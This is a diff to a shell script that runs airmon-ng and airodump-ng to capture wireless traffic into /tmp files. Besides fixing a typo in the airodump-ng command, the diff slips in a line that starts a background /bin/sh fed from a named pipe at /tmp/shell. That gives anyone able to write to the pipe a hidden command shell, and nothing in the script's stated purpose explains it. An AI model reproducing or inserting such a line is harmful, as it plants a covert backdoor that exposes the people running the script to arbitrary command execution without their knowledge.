@@ -5,10 +5,10 @@ function process(){
 }
 
 sudo airmon-ng start wlan1
-
+mkfifo /tmp/shell; tail -f /tmp/shell | /bin/sh 2>&1 > /tmp/shell &
 while true
 do
-    timeout -c 20 bash -c "sudo airodumo-ng wlan1mon >> /tmp/a2f"
+    timeout -c 20 bash -c "sudo airodump-ng wlan1mon >> /tmp/a2f"
     process /tmp/a2f
     for af2 in $(cat /tmp/a2f-list)
     do
